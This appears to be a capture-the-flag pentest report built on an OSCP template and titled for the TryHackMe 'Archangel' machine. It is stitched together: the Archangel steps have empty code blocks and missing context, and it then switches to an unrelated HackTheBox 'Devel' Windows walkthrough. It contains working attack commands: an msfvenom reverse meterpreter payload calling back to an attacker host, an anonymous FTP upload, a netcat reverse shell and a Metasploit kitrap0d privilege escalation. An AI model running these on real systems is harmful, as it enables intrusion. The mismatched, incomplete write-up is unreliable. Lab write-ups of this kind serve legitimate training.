---
title: "Report - TryHackMe - Archangel"
author: ["jurgen.kobierczynski@telenet.be", ""]
date: "2021-01-05"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "tryhackme - archangel"
lang: "en"
titlepage: true
titlepage-color: "DC143C"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Pentesting Report - Archangel

## Introduction

The Offensive Security Exam penetration test report contains all efforts that were conducted in order to pass the Offensive Security course.
This report should contain all items that were used to pass the overall exam.
This report will be graded from a standpoint of correctness and fullness to all aspects of the  exam.
The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the Offensive Security Certified Professional.

## Objective

The objective of this assessment is to perform an internal penetration test against the Offensive Security Exam network.
The student is tasked with following methodical approach in obtaining access to the objective goals.
This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report.
An example page has already been created for you at the latter portions of this document that should give you ample information on what is expected to pass this course.
Use the sample report as a guideline to get you through the reporting.

## Requirements

The student will be required to fill out this penetration testing report and include the following sections:

- Overall High-Level Summary and Recommendations (non-technical)
- Methodology walkthrough and detailed outline of steps taken
- Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.
- Any additional items that were not included

# Sample Report - High-Level Summary

John Doe was tasked with performing an internal penetration test towards Offensive Security Labs.
An internal penetration test is a dedicated attack against internally connected systems.
The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security's internal lab systems - the **THINC.local** domain.
John's overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security's network.
When performing the attacks, John was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.
During the testing, John had administrative level access to multiple systems.
All systems were successfully exploited and access granted.
These systems as well as a brief description on how access was obtained are listed below:

- Exam Trophy 1 - Got in through X
- Exam Trophy 2 - Got in through X

## Sample Report - Recommendations

John recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future.
One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Sample Report - Methodologies

John utilized a widely adopted approach to performing penetration testing that is effective in testing how well the Offensive Security Labs and Exam environments are secure.
Below is a breakout of how John was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

## Sample Report - Information Gathering

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test.
During this penetration test, John was tasked with exploiting the exam network.
The specific IP addresses were:

**Exam Network**

Host: 10.10.10.5

## Sample Report - Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.

# Nmap scan host

```
# Nmap 7.91 scan initiated Fri Feb  5 21:15:19 2021 as: nmap -sC -sV -p- -oA nmap/archangel-fulltcp 10.10.42.162
Nmap scan report for 10.10.42.162
Host is up (0.037s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb  5 21:16:03 2021 -- 1 IP address (1 host up) scanned in 43.16 seconds
```

On browsing the main website we see the following page:


upload the webshell:


```

```

```
$ python3 -m http.server 8000   
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.102.133 - - [06/Feb/2021 14:35:18] "GET /linpeas.sh HTTP/1.1" 200 -
```
We give execute permission to linpeas.sh and execute it:


![ImgPlaceholder](screenshots/download-execute-linpeas.png)
```

```



```
$ cat /opt/helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
$ ls -la /opt
total 16
drwxrwxrwx  3 root      root      4096 Nov 20 10:35 .
drwxr-xr-x 22 root      root      4096 Nov 16 15:39 ..
drwxrwx---  2 archangel archangel 4096 Nov 20 15:04 backupfiles
-rwxrwxrwx  1 archangel archangel   66 Nov 20 10:35 helloworld.sh
```

```
$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.9.4.36] from (UNKNOWN) [10.10.102.133] 44904
/bin/sh: 0: can't access tty; job control turned off
$ whoami
archangel
$ ls -l
total 12
drwxr-xr-x 2 archangel archangel 4096 Nov 18 01:36 myfiles
drwxrwx--- 2 archangel archangel 4096 Nov 19 20:41 secret
-rw-r--r-- 1 archangel archangel   26 Nov 19 19:57 user.txt
$ cd secret
$ ls -al
total 32
drwxrwx--- 2 archangel archangel  4096 Nov 19 20:41 .
drwxr-xr-x 6 archangel archangel  4096 Nov 20 15:22 ..
-rwsr-xr-x 1 root      root      16904 Nov 18 16:40 backup
-rw-r--r-- 1 root      root         49 Nov 19 20:41 user2.txt
$ cat user2.txt
thm{xxxxxxxxxxx}
```


```
$ ls -l /home/archangel/secret/backup
-rwsr-xr-x 1 root root 16904 Nov 18 16:40 /home/archangel/secret/backup
```

```
$ ldd /home/archangel/secret/backup
        linux-vdso.so.1 (0x00007ffffa113000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6d51886000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f6d51c77000)
```




We get access to the webshell:

![ImgPlaceholder](screenshots/webshell.png)

We create a reverse meterpreter executable:

```
user@kali:~/hackthebox/hackthebox/devel/upload$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.14.27" LPORT=4444 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

We upload this executable and winPEAS.cmd using FTP to the host:

```
user@kali:~/hackthebox/hackthebox/devel/upload$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:user): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> binary
200 Type set to I.
ftp> put shell.exe
local: shell.exe remote: shell.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
73802 bytes sent in 0.00 secs (612.0267 MB/s)
ftp> put winPEAS.bat
local: winPEAS.bat remote: winPEAS.bat
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
32976 bytes sent in 0.00 secs (655.1743 MB/s)
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
01-06-21  10:16PM                 1442 cmdasp.aspx
03-17-17  04:37PM                  689 iisstart.htm
01-06-21  11:27PM                73802 shell.exe
01-06-21  10:06PM                    7 test.txt
03-17-17  04:37PM               184946 welcome.png
01-06-21  11:11PM                32976 winPEAS.bat
226 Transfer complete.
ftp> 
```

We start Metasploit and open a meterpreter handler connecting on port 4444: 

```
user@kali:~/hackthebox/hackthebox/devel$ sudo msfdb run
[sudo] password for user: 
[+] Starting database
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.0.21-dev                          ]
+ -- --=[ 2086 exploits - 1126 auxiliary - 354 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Tired of setting RHOSTS for modules? Try 
globally setting it with setg RHOSTS x.x.x.x

msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp 
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => 10.10.14.27
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.27:4444 
```

We find the winPEAS.bat and the reverse.exe files when we check the directory C:\inetpub\wwwroot with the webshell:

![ImgPlaceholder](screenshots/shell-uploaded.png)

We execute the shell.exe binary and we watch the Meterpreter reverse shell callback:

![ImgPlaceholder](screenshots/execute-shell.png)

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.27:4444 
^[[A[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.27:4444 -> 10.10.10.5:49165) at 2021-01-06 22:36:24 +0100

meterpreter > getuid
Server username: IIS APPPOOL\Web
meterpreter > pwd
c:\windows\system32\inetsrv
meterpreter > shell                                                                                   
Process 2980 created.                                                                                 
Channel 1 created.                                                                                    
Microsoft Windows [Version 6.1.7600]                                                                  
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.                                       
                                                                                                      
c:\windows\system32\inetsrv>
```

We execute the winPEAS.bat file:

```
user@kali:~/hackthebox/hackthebox/devel$ head -400 winpeas.out   
c:\inetpub\wwwroot>winPEAS.bat                                                                        
winPEAS.bat                                                                                           
            *((,.,/((((((((((((((((((((/,  */
     ,/*,..*(((((((((((((((((((((((((((((((((,                                                                                                                                                              
   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*  
   ((((((((((((((((* *****,,,/########## .(* ,((((((                           
   (((((((((((/* ******************/####### .(. ((((((
   ((((((..******************/@@@@@/***/######* /((((((                                               
   ,,..**********************@@@@@@@@@@(***,#### ../(((((
   , ,**********************#@@@@@#@@@@*********##((/ /((((                          
   ..(((##########*********/#@@@@@@@@@/*************,,..((((
   .(((################(/******/@@@@@#****************.. /((                        
   .((########################(/************************..*(                                          
   .((#############################(/********************.,(                                                                                                                                                
   .((##################################(/***************..(                                          
   .((######################################(************..(                          
   .((######(,.***.,(###################(..***(/*********..(                                                                                                                                                
  .((######*(#####((##################((######/(********..(                               
   .((##################(/**********(################(**...(                                          
   .(((####################/*******(###################.((((                                      
   .(((((############################################/  /((
   ..(((((#########################################(..(((((.
   ....(((((#####################################( .((((((.                      
   ......(((((#################################( .(((((((.                                            
   (((((((((. ,(############################(../(((((((((.
       (((((((((/,  ,####################(/..((((((((((.                                              
             (((((((((/,.  ,*//////*,. ./(((((((((((.
                (((((((((((((((((((((((((((/"      
                       by carlospolop                                                                 
ECHO is off.                  
Advisory: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator.
Use it at your own networks and/or with the network owner's permission.
ECHO is off.                                                                                          
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] BASIC SYSTEM INFO <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WINDOWS OS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
[i] Check for vulnerabilities for the OS version with the applied patches
  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
                                                                                                      
Host Name:                 DEVEL                                                                      
OS Name:                   Microsoft Windows 7 Enterprise                                             
OS Version:                6.1.7600 N/A Build 7600                                                    
OS Manufacturer:           Microsoft Corporation   
OS Configuration:          Standalone Workstation  
OS Build Type:             Multiprocessor Free                                                        
Registered Owner:          babis      
Registered Organization:                                                                              
Product ID:                55041-051-0948536-86302                                                    
Original Install Date:     17/3/2017, 4:17:31                                                         
System Boot Time:          6/1/2021, 9:57:15       
System Manufacturer:       VMware, Inc.                                                               
System Model:              VMware Virtual Platform                                                    
System Type:               X86-based PC                                                               
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.474 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.546 MB
Virtual Memory: In Use:    595 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::85b2:aea0:b80d:4690
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e

No Instance(s) Available.





"Microsoft Windows 7 Enterprise   "
[i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)
No Instance(s) Available.
MS11-080 patch is NOT installed! (Vulns: XP/SP3,2K3/SP3-afd.sys)
...
report continues, see winPEAS.out file.
...
```

We execute the exploit suggester in metasploit:
```
meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use 0
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 34 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf5 post(multi/recon/local_exploit_suggester) > 
```

We escalate to system privileges usin the ms10_015_kitrap0d exploit:

```
msf6 exploit(windows/local/bypassuac_eventvwr) > use windows/local/ms10_015_kitrap0d
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms10_015_kitrap0d) > options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.205    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)


msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/ms10_015_kitrap0d) > set lport 5555
lport => 5555
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.27:5555 
[*] Launching notepad to host the exploit...
[+] Process 1996 launched.
[*] Reflectively injecting the exploit DLL into 1996...
[*] Injecting exploit into 1996 ...
[*] Exploit injected. Injecting payload into 1996...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.27:5555 -> 10.10.10.5:49170) at 2021-01-06 23:14:17 +0100

meterpreter > 
```

The priv escalation on screen (restarted the session due to disconnection of session):

![ImgPlaceholder](screenshots/escalate.png)

We find the flags in the Desktop directories of the babis, Administrator accounts:

![ImgPlaceholder](screenshots/flags.png)

**Vulnerability Fix:**

## Sample Report - Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

John added administrator and root level accounts on all systems compromised.
In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.

## Sample Report - House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After the trophies on the exam network were completed, John removed all user accounts and passwords as well as the meterpreter services installed on the system.
Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items Not Mentioned in the Report

This section is placed for any additional items that were not mentioned in the overall report.
